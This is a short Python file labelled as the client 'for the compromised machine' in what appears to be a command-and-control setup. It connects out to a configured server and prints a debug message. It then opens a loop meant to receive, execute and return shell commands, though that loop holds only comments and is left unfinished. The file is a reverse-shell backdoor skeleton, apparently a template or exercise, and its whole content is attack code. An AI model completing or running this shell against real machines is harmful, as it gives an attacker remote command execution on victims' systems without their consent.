# client.py - For the compromised machine

import socket
import subprocess

import configuration as config  # Import configuration file

# CONSTANTS
ADDRESS = (config.SERVER_ADDR, config.SERVER_PORT)

########################
# CODE BEGINS
########################

# Create a socket to connect to the server
connection_socket = socket.socket()
# Connect to the server
connection_socket.connect(ADDRESS)

# Receive the debug message
message = connection_socket.recv(config.PAYLOAD_SIZE).decode()
print("Debug message: ", message)

# Client REPL loop - run the interactive shell
while True:
    # Receive command from the C2 server
    # Execute the command
        # Note: break out of loop if the command was 'exit' or 'hangup'
    # Send the results to the server
